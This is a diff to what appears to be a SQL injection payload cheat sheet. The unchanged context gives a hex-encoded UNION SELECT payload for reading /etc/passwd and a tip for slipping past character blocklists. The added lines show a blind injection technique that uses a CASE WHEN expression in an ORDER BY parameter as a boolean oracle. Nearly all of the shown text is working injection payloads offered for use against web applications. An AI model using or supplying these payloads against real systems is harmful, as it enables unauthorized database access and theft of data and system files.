@@ -34,3 +34,10 @@ If `;` or `/` are blocklisted, hex-encode the whole payload — most engines acc
 ```bash
 0x2d3120554e494f4e2053454c454354204e554c4c2c4e554c4c2c222f6574632f706173737764220a   # = -1 UNION SELECT NULL,NULL,"/etc/passwd"
 ```
+
+Blind SQLi in an `ORDER BY` clause — you can't UNION or subquery there directly, but a `CASE WHEN` expression works as a boolean oracle:
+```bash
+?order=(CASE WHEN(<boolean-condition>) THEN <col-A> ELSE <col-B> END)
+# swaps sort order between two known columns depending on whether the condition is true
+```
+
